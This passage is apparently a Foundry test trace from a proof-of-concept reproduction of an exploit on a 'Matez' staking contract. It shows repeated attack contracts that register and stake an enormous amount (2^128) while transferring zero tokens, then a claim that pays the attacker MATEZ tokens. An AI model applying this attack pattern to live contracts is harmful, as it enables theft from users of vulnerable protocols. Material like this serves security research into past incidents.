+    │   │   ├─ emit upgrade_package(: 3630, : 340282366920938463463374607431768211456 [3.402e38])
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return] 62 bytes of code
+    ├─ [237664] → new AttackContract@0x13aa49bAc059d709dd0a18D6bb63290076a702D7
+    │   ├─ [92017] 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa::register(Matez: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   ├─ emit Register(: 3631, : AttackContract: [0x13aa49bAc059d709dd0a18D6bb63290076a702D7], : 3614)
+    │   │   └─ ← [Stop]
+    │   ├─ [132229] 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa::stake(340282366920938463463374607431768211456 [3.402e38])
+    │   │   ├─ [5376] 0xC0319e8f278BE2228Fd0baD12EdFEC7B25d16d54::observe([1, 0]) [staticcall]
+    │   │   │   └─ ← [Return] [234165454722 [2.341e11], 234165502094 [2.341e11]], [735109582075494098706955 [7.351e23], 735109617701852568449015 [7.351e23]]
+    │   │   ├─ [10034] 0x010C0D77055A26D09bb474EF8d81975F55bd8Fc9::transferFrom(AttackContract: [0x13aa49bAc059d709dd0a18D6bb63290076a702D7], 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, 0)
+    │   │   │   ├─ emit Transfer(from: AttackContract: [0x13aa49bAc059d709dd0a18D6bb63290076a702D7], to: 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, value: 0)
+    │   │   │   ├─ emit Approval(owner: AttackContract: [0x13aa49bAc059d709dd0a18D6bb63290076a702D7], spender: 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, value: 0)
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ emit upgrade_package(: 3631, : 340282366920938463463374607431768211456 [3.402e38])
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return] 62 bytes of code
+    ├─ [237664] → new AttackContract@0xDB25A7b768311dE128BBDa7B8426c3f9C74f3240
+    │   ├─ [92017] 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa::register(Matez: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   ├─ emit Register(: 3632, : AttackContract: [0xDB25A7b768311dE128BBDa7B8426c3f9C74f3240], : 3614)
+    │   │   └─ ← [Stop]
+    │   ├─ [132229] 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa::stake(340282366920938463463374607431768211456 [3.402e38])
+    │   │   ├─ [5376] 0xC0319e8f278BE2228Fd0baD12EdFEC7B25d16d54::observe([1, 0]) [staticcall]
+    │   │   │   └─ ← [Return] [234165454722 [2.341e11], 234165502094 [2.341e11]], [735109582075494098706955 [7.351e23], 735109617701852568449015 [7.351e23]]
+    │   │   ├─ [10034] 0x010C0D77055A26D09bb474EF8d81975F55bd8Fc9::transferFrom(AttackContract: [0xDB25A7b768311dE128BBDa7B8426c3f9C74f3240], 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, 0)
+    │   │   │   ├─ emit Transfer(from: AttackContract: [0xDB25A7b768311dE128BBDa7B8426c3f9C74f3240], to: 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, value: 0)
+    │   │   │   ├─ emit Approval(owner: AttackContract: [0xDB25A7b768311dE128BBDa7B8426c3f9C74f3240], spender: 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, value: 0)
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ emit upgrade_package(: 3632, : 340282366920938463463374607431768211456 [3.402e38])
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return] 62 bytes of code
+    ├─ [237664] → new AttackContract@0x3381cD18e2Fb4dB236BF0525938AB6E43Db0440f
+    │   ├─ [92017] 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa::register(Matez: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   ├─ emit Register(: 3633, : AttackContract: [0x3381cD18e2Fb4dB236BF0525938AB6E43Db0440f], : 3614)
+    │   │   └─ ← [Stop]
+    │   ├─ [132229] 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa::stake(340282366920938463463374607431768211456 [3.402e38])
+    │   │   ├─ [5376] 0xC0319e8f278BE2228Fd0baD12EdFEC7B25d16d54::observe([1, 0]) [staticcall]
+    │   │   │   └─ ← [Return] [234165454722 [2.341e11], 234165502094 [2.341e11]], [735109582075494098706955 [7.351e23], 735109617701852568449015 [7.351e23]]
+    │   │   ├─ [10034] 0x010C0D77055A26D09bb474EF8d81975F55bd8Fc9::transferFrom(AttackContract: [0x3381cD18e2Fb4dB236BF0525938AB6E43Db0440f], 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, 0)
+    │   │   │   ├─ emit Transfer(from: AttackContract: [0x3381cD18e2Fb4dB236BF0525938AB6E43Db0440f], to: 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, value: 0)
+    │   │   │   ├─ emit Approval(owner: AttackContract: [0x3381cD18e2Fb4dB236BF0525938AB6E43Db0440f], spender: 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, value: 0)
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ emit upgrade_package(: 3633, : 340282366920938463463374607431768211456 [3.402e38])
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return] 62 bytes of code
+    ├─ [237664] → new AttackContract@0x756e0562323ADcDA4430d6cb456d9151f605290B
+    │   ├─ [92017] 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa::register(Matez: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   ├─ emit Register(: 3634, : AttackContract: [0x756e0562323ADcDA4430d6cb456d9151f605290B], : 3614)
+    │   │   └─ ← [Stop]
+    │   ├─ [132229] 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa::stake(340282366920938463463374607431768211456 [3.402e38])
+    │   │   ├─ [5376] 0xC0319e8f278BE2228Fd0baD12EdFEC7B25d16d54::observe([1, 0]) [staticcall]
+    │   │   │   └─ ← [Return] [234165454722 [2.341e11], 234165502094 [2.341e11]], [735109582075494098706955 [7.351e23], 735109617701852568449015 [7.351e23]]
+    │   │   ├─ [10034] 0x010C0D77055A26D09bb474EF8d81975F55bd8Fc9::transferFrom(AttackContract: [0x756e0562323ADcDA4430d6cb456d9151f605290B], 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, 0)
+    │   │   │   ├─ emit Transfer(from: AttackContract: [0x756e0562323ADcDA4430d6cb456d9151f605290B], to: 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, value: 0)
+    │   │   │   ├─ emit Approval(owner: AttackContract: [0x756e0562323ADcDA4430d6cb456d9151f605290B], spender: 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, value: 0)
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ emit upgrade_package(: 3634, : 340282366920938463463374607431768211456 [3.402e38])
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return] 62 bytes of code
+    ├─ [237664] → new AttackContract@0x1aF7f588A501EA2B5bB3feeFA744892aA2CF00e6
+    │   ├─ [92017] 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa::register(Matez: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   ├─ emit Register(: 3635, : AttackContract: [0x1aF7f588A501EA2B5bB3feeFA744892aA2CF00e6], : 3614)
+    │   │   └─ ← [Stop]
+    │   ├─ [132229] 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa::stake(340282366920938463463374607431768211456 [3.402e38])
+    │   │   ├─ [5376] 0xC0319e8f278BE2228Fd0baD12EdFEC7B25d16d54::observe([1, 0]) [staticcall]
+    │   │   │   └─ ← [Return] [234165454722 [2.341e11], 234165502094 [2.341e11]], [735109582075494098706955 [7.351e23], 735109617701852568449015 [7.351e23]]
+    │   │   ├─ [10034] 0x010C0D77055A26D09bb474EF8d81975F55bd8Fc9::transferFrom(AttackContract: [0x1aF7f588A501EA2B5bB3feeFA744892aA2CF00e6], 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, 0)
+    │   │   │   ├─ emit Transfer(from: AttackContract: [0x1aF7f588A501EA2B5bB3feeFA744892aA2CF00e6], to: 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, value: 0)
+    │   │   │   ├─ emit Approval(owner: AttackContract: [0x1aF7f588A501EA2B5bB3feeFA744892aA2CF00e6], spender: 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, value: 0)
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ emit upgrade_package(: 3635, : 340282366920938463463374607431768211456 [3.402e38])
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return] 62 bytes of code
+    ├─ [237664] → new AttackContract@0xe8dc788818033232EF9772CB2e6622F1Ec8bc840
+    │   ├─ [92017] 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa::register(Matez: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   ├─ emit Register(: 3636, : AttackContract: [0xe8dc788818033232EF9772CB2e6622F1Ec8bc840], : 3614)
+    │   │   └─ ← [Stop]
+    │   ├─ [132229] 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa::stake(340282366920938463463374607431768211456 [3.402e38])
+    │   │   ├─ [5376] 0xC0319e8f278BE2228Fd0baD12EdFEC7B25d16d54::observe([1, 0]) [staticcall]
+    │   │   │   └─ ← [Return] [234165454722 [2.341e11], 234165502094 [2.341e11]], [735109582075494098706955 [7.351e23], 735109617701852568449015 [7.351e23]]
+    │   │   ├─ [10034] 0x010C0D77055A26D09bb474EF8d81975F55bd8Fc9::transferFrom(AttackContract: [0xe8dc788818033232EF9772CB2e6622F1Ec8bc840], 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, 0)
+    │   │   │   ├─ emit Transfer(from: AttackContract: [0xe8dc788818033232EF9772CB2e6622F1Ec8bc840], to: 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, value: 0)
+    │   │   │   ├─ emit Approval(owner: AttackContract: [0xe8dc788818033232EF9772CB2e6622F1Ec8bc840], spender: 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, value: 0)
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ emit upgrade_package(: 3636, : 340282366920938463463374607431768211456 [3.402e38])
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return] 62 bytes of code
+    ├─ [237664] → new AttackContract@0x3Cff5E7eBecb676c3Cb602D0ef2d46710b88854E
+    │   ├─ [92017] 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa::register(Matez: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   ├─ emit Register(: 3637, : AttackContract: [0x3Cff5E7eBecb676c3Cb602D0ef2d46710b88854E], : 3614)
+    │   │   └─ ← [Stop]
+    │   ├─ [132229] 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa::stake(340282366920938463463374607431768211456 [3.402e38])
+    │   │   ├─ [5376] 0xC0319e8f278BE2228Fd0baD12EdFEC7B25d16d54::observe([1, 0]) [staticcall]
+    │   │   │   └─ ← [Return] [234165454722 [2.341e11], 234165502094 [2.341e11]], [735109582075494098706955 [7.351e23], 735109617701852568449015 [7.351e23]]
+    │   │   ├─ [10034] 0x010C0D77055A26D09bb474EF8d81975F55bd8Fc9::transferFrom(AttackContract: [0x3Cff5E7eBecb676c3Cb602D0ef2d46710b88854E], 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, 0)
+    │   │   │   ├─ emit Transfer(from: AttackContract: [0x3Cff5E7eBecb676c3Cb602D0ef2d46710b88854E], to: 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, value: 0)
+    │   │   │   ├─ emit Approval(owner: AttackContract: [0x3Cff5E7eBecb676c3Cb602D0ef2d46710b88854E], spender: 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, value: 0)
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ emit upgrade_package(: 3637, : 340282366920938463463374607431768211456 [3.402e38])
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return] 62 bytes of code
+    ├─ [237664] → new AttackContract@0x27cc01A4676C73fe8b6d0933Ac991BfF1D77C4da
+    │   ├─ [92017] 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa::register(Matez: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   ├─ emit Register(: 3638, : AttackContract: [0x27cc01A4676C73fe8b6d0933Ac991BfF1D77C4da], : 3614)
+    │   │   └─ ← [Stop]
+    │   ├─ [132229] 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa::stake(340282366920938463463374607431768211456 [3.402e38])
+    │   │   ├─ [5376] 0xC0319e8f278BE2228Fd0baD12EdFEC7B25d16d54::observe([1, 0]) [staticcall]
+    │   │   │   └─ ← [Return] [234165454722 [2.341e11], 234165502094 [2.341e11]], [735109582075494098706955 [7.351e23], 735109617701852568449015 [7.351e23]]
+    │   │   ├─ [10034] 0x010C0D77055A26D09bb474EF8d81975F55bd8Fc9::transferFrom(AttackContract: [0x27cc01A4676C73fe8b6d0933Ac991BfF1D77C4da], 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, 0)
+    │   │   │   ├─ emit Transfer(from: AttackContract: [0x27cc01A4676C73fe8b6d0933Ac991BfF1D77C4da], to: 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, value: 0)
+    │   │   │   ├─ emit Approval(owner: AttackContract: [0x27cc01A4676C73fe8b6d0933Ac991BfF1D77C4da], spender: 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, value: 0)
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ emit upgrade_package(: 3638, : 340282366920938463463374607431768211456 [3.402e38])
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return] 62 bytes of code
+    ├─ [237664] → new AttackContract@0x796f2974e3C1af763252512dd6d521E9E984726C
+    │   ├─ [92017] 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa::register(Matez: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   ├─ emit Register(: 3639, : AttackContract: [0x796f2974e3C1af763252512dd6d521E9E984726C], : 3614)
+    │   │   └─ ← [Stop]
+    │   ├─ [132229] 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa::stake(340282366920938463463374607431768211456 [3.402e38])
+    │   │   ├─ [5376] 0xC0319e8f278BE2228Fd0baD12EdFEC7B25d16d54::observe([1, 0]) [staticcall]
+    │   │   │   └─ ← [Return] [234165454722 [2.341e11], 234165502094 [2.341e11]], [735109582075494098706955 [7.351e23], 735109617701852568449015 [7.351e23]]
+    │   │   ├─ [10034] 0x010C0D77055A26D09bb474EF8d81975F55bd8Fc9::transferFrom(AttackContract: [0x796f2974e3C1af763252512dd6d521E9E984726C], 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, 0)
+    │   │   │   ├─ emit Transfer(from: AttackContract: [0x796f2974e3C1af763252512dd6d521E9E984726C], to: 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, value: 0)
+    │   │   │   ├─ emit Approval(owner: AttackContract: [0x796f2974e3C1af763252512dd6d521E9E984726C], spender: 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, value: 0)
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ emit upgrade_package(: 3639, : 340282366920938463463374607431768211456 [3.402e38])
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return] 62 bytes of code
+    ├─ [111121] 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa::claim(3, 1, 0)
+    │   ├─ [5376] 0xC0319e8f278BE2228Fd0baD12EdFEC7B25d16d54::observe([1, 0]) [staticcall]
+    │   │   └─ ← [Return] [234165454722 [2.341e11], 234165502094 [2.341e11]], [735109582075494098706955 [7.351e23], 735109617701852568449015 [7.351e23]]
+    │   ├─ [25971] 0x010C0D77055A26D09bb474EF8d81975F55bd8Fc9::transfer(Matez: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1753044885823151963 [1.753e18])
+    │   │   ├─ emit Transfer(from: 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, to: Matez: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1753044885823151963 [1.753e18])
+    │   │   └─ ← [Return] true
+    │   ├─  emit topic 0: 0x935a5aa2f3210fdc9bcf2ba002f62158ae895b32c6896b53e74ff56fc472101b
+    │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000e1e00000000000000000000000000000000000000000000000ad78ebc5ac62000000000000000000000000000000000000000000000000000000000000000000003
+    │   └─ ← [Stop]
+    ├─ [1081] 0x010C0D77055A26D09bb474EF8d81975F55bd8Fc9::symbol() [staticcall]
+    │   └─ ← [Return] "MATEZ"
+    ├─ [531] 0x010C0D77055A26D09bb474EF8d81975F55bd8Fc9::balanceOf(Matez: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 1753044885823151963 [1.753e18]
+    ├─ [336] 0x010C0D77055A26D09bb474EF8d81975F55bd8Fc9::decimals() [staticcall]
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: "Attacker MATEZ Balance After exploit", val: 1753044885823151963 [1.753e18], decimals: 18)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 541.18ms (16.17ms CPU time)
+
+Ran 1 test suite in 555.01ms (541.18ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
